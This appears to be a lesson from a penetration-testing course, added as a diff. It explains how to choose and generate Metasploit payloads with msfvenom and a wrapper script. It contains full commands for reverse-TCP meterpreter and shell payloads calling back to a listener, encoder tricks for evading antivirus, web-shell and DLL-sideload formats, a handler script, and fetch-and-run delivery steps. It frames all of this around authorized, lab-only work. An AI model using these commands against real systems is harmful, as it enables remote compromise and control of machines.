@@ -1,0 +1,237 @@
+## Picking the payload — five questions
+
+Before reaching for msfvenom, answer five questions in order:
+
+1. **Target OS?** Windows, Linux, macOS, Java, PHP, web shell language. This
+   constrains everything else.
+2. **Architecture?** x64 or x86. Mismatch silently breaks features.
+3. **Format?** Binary on disk (`exe`, `dll`, `elf`), web shell (`asp`, `aspx`,
+   `jsp`, `php`), source/raw (`c`, `python`, `raw`, `psh`)?
+4. **Network protocol?** `tcp`, `https`, `http`. HTTPS is more egress-friendly
+   but noisier to AV; plain TCP is quiet on the wire (with EnableStageEncoding)
+   but blocked by many egress firewalls.
+5. **Staged or stageless?** Default staged. Switch to stageless when the network
+   may block the stage 2 callback, or when you need a one-shot payload.
+
+`msfvenom-gen.sh --list-recipes` shows the preset combos. Most engagements
+land on one of these:
+
+```text
+win-meterp-exe         windows         meterpreter      exe       Reverse TCP meterpreter, standalone exe
+win-meterp-https       windows         meterpreter      exe       HTTPS variant for egress-friendly callback
+win-meterp-dll         windows         meterpreter      dll       For sideloading/injection
+win-meterp-svc         windows         meterpreter      exe-service  Service-shaped for service install
+win-shellcode-c        windows         meterpreter      c         Raw shellcode in C array (custom loader)
+lin-meterp-elf         linux           meterpreter      elf       Reverse TCP ELF
+java-meterp-jar        java            meterpreter      jar       Cross-platform JAR
+java-war               java            meterpreter      war       Tomcat WAR
+php-meterp             php             meterpreter      raw       PHP webshell drop
+psh-meterp             powershell      meterpreter      psh       PowerShell stager (encoded)
+```
+
+Apply a recipe with `--recipe <id>`:
+
+```bash
+./scripts/msfvenom-gen.sh --recipe win-meterp-exe \
+  --lhost 10.0.0.5 --lport 4444 \
+  --engagement client-2026 \
+  --execute
+```
+
+## What the wrapper does for you
+
+`msfvenom-gen.sh` is not a re-implementation of msfvenom. It's a thin shell
+that:
+
+1. **Routes output** to `~/assessments/<engagement>/05-exploitation/payloads/`
+   (or `~/incidents/<id>/07-evidence/payloads/`).
+2. **Names the file** with timestamp + payload type so you don't end up with
+   five files called `shell.exe`.
+3. **Generates a handler RC** alongside the payload, with matching LHOST/LPORT
+   already filled in.
+4. **Writes a manifest JSON** with SHA-256 hash, generation parameters, and
+   timestamps — the chain-of-custody artifact.
+5. **Gates execution** behind an authorization confirmation when `--execute`
+   is passed and the engagement has an `00-authorization.txt`.
+
+Manifest example:
+
+```json
+{
+  "payload": "windows/x64/meterpreter/reverse_tcp",
+  "format": "exe",
+  "arch": "x64",
+  "lhost": "10.0.0.5",
+  "lport": "4444",
+  "encoder": "",
+  "iterations": "0",
+  "output": "/home/op/assessments/client-2026/05-exploitation/payloads/20260514-093011-windows-x64-meterpreter-reverse_tcp.exe",
+  "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+  "engagement": "client-2026",
+  "generated_at": "2026-05-14T09:30:11Z",
+  "generated_by": "op@kali"
+}
+```
+
+Six months later, this is the only way you'll know which payload landed where.
+
+## Encoders — the reality check
+
+The honest truth: encoders defeat *static* signature matching. They don't defeat
+*dynamic* (sandbox / behavioral) analysis, and they don't defeat modern EDR.
+
+- `x86/shikata_ga_nai` — historically the default. Polymorphic XOR. Today's AV
+  catches it on sight.
+- `x64/xor_dynamic` — x64 default. Less signatured than shikata. Still caught
+  by reputable AV in most cases.
+- `cmd/perl` — only useful for command-line escape; not real obfuscation.
+
+What `-i N` iterations buy you:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.0.0.5 LPORT=4444 \
+  -e x64/xor_dynamic -i 5 \
+  -f exe -o shell.exe
+```
+
+The payload runs through the encoder 5 times. Slightly different byte pattern.
+**Static signatures may miss it. Modern AV won't.** For real evasion, msfvenom
+is the wrong tool entirely — you'd be hand-rolling a loader.
+
+What encoders *are* useful for:
+
+- **Bad-char avoidance.** `-b '\x00\x0a\x0d\x20'` tells msfvenom to encode
+  around bytes that would break the exploit primitive (null terminators in
+  buffer overflows, newline in HTTP injection, etc.).
+- **Template injection.** `-x legit.exe` wraps your payload in a legitimate
+  binary template. AV catches modified versions, but the technique exists.
+
+## Format-by-target cheat sheet
+
+| Target environment       | Format | Notes |
+|--------------------------|--------|-------|
+| Windows desktop          | `exe`  | Default. Pass `-x legit.exe` to template. |
+| Windows service install  | `exe-service` | Required for `sc create`. |
+| Windows DLL sideload     | `dll`  | Drop next to a legitimate exe with hijack opportunity. |
+| Buffer overflow on Linux | `raw`  | Raw bytes, no header. Concatenate into exploit. |
+| Buffer overflow on Win   | `c`    | C array. Inject via custom loader. |
+| Tomcat                   | `war`  | Drop into webapps/, autodeploys. |
+| Java JRE                 | `jar`  | Run with `java -jar`. |
+| PHP webshell             | `raw` + format php | Save as `.php` on target webroot. |
+| Classic ASP              | `asp`  | IIS classic ASP support. |
+| ASP.NET                  | `aspx` | IIS modern. |
+| PowerShell stager        | `psh`  | Encoded one-liner — `-EncodedCommand` shape. |
+| Android                  | `apk`  | Install with `adb install`. |
+| Shellcode for exploit dev| `python` | Bytes in Python source — easy to read & paste. |
+
+## Bad characters — when they matter
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.0.0.5 LPORT=4444 \
+  -b '\x00\x0a\x0d' \
+  -f raw -o sploit.bin
+```
+
+`-b` matters when the exploit primitive can't carry certain bytes:
+
+- **`\x00`** breaks strcpy and any null-terminated context
+- **`\x0a`, `\x0d`** break HTTP headers and other line-based parsing
+- **`\x20`** breaks command-line args
+- **`\x2f`** breaks path-injection contexts
+
+Buffer overflow workflow:
+
+1. Crash the target with a long pattern
+2. Identify the offset using `pattern_create.rb` / `pattern_offset.rb`
+3. Find what bytes get mangled in transit (use `\x00` through `\xff` and
+   compare in a debugger)
+4. List those as `-b` when generating the payload
+
+## Handler companion file
+
+Every `msfvenom-gen.sh` output ships a handler RC:
+
+```ruby
+# Auto-generated handler for /path/to/payload.exe
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j -z
+```
+
+Launch it before you deliver the payload:
+
+```bash
+msfconsole -q -r handler-windows-x64-meterpreter-reverse_tcp.rc
+```
+
+If you deliver the payload before the handler is up, the first callback drops
+on the floor. Some payloads retry (depends on the variant); many don't.
+
+## Delivery is not the lesson — but a quick word
+
+Generating a payload is half of one step. *Delivering* it to the target is
+where engagements live or die. The toolkit doesn't ship a delivery mechanism
+(deliberately — that's where the lines between "training" and "production
+red team" sit). For lab work:
+
+- Drop the payload on a small HTTP server you control: `python3 -m http.server`
+- On the target, `curl` or `Invoke-WebRequest` it down
+- Run it (lab-style — no AV interference assumed)
+
+In a real engagement, the delivery is the engagement. Pretending msfvenom + a
+curl is a viable delivery mechanism in 2026 is how you learn that EDR is
+loud about that exact pattern.
+
+<Checkpoint
+  id="msfvenom-payloads"
+  questions={[
+    {
+      q: "You generate a Windows EXE with x86/shikata_ga_nai encoded 10 times. Will it bypass enterprise AV?",
+      options: [
+        "Yes — encoding defeats AV",
+        "Yes if iteration count is high enough",
+        "No — encoders defeat static signatures only. Modern AV does dynamic/behavioral analysis on the payload's actions, which encoders don't affect",
+        "Only on 32-bit targets",
+      ],
+      answer: 2,
+      why: "Encoders alter bytes. Modern AV doesn't care — it watches what the binary *does* (memory allocations, API call sequences, network behavior). Real evasion is a custom loader, not msfvenom.",
+    },
+    {
+      q: "msfvenom-gen.sh writes a manifest JSON alongside every payload. What's the manifest for?",
+      options: [
+        "It's required by msfconsole",
+        "It speeds up payload generation",
+        "Chain of custody — records SHA-256, params, engagement, timestamp. Six months later, this is how you prove what payload was used where",
+        "Anti-forensics",
+      ],
+      answer: 2,
+      why: "Manifest is the durable artifact. Without it, the payload binary is anonymous bytes on disk. Same discipline as forensics-collect's chain-of-custody.",
+    },
+    {
+      q: "Your buffer overflow exploit has a 1024-byte payload window. You need a meterpreter. Right msfvenom approach?",
+      options: [
+        "Stageless meterpreter — fits in one shot",
+        "Staged meterpreter — the stager is ~250 bytes, fits in the window; stage 2 downloads after the session is established",
+        "Use a plain reverse shell instead — meterpreter is too big",
+        "Encode the stageless payload to compress it",
+      ],
+      answer: 1,
+      why: "Staged exists for exactly this. The stager fits in the constrained primitive; the full payload (~200KB) downloads over the established channel.",
+    },
+  ]}
+/>
+
+## Action items
+
+1. `./scripts/msfvenom-gen.sh --list-recipes` — read every entry.
+2. Generate a payload (dry run): `./scripts/msfvenom-gen.sh --recipe win-meterp-exe --lhost 10.0.0.5`
+3. Read the generated command. Run it with `--execute` only inside the lab.
+4. Examine the manifest JSON. Note what gets recorded.
+
+Next lesson: sessions and post-exploit recipes.
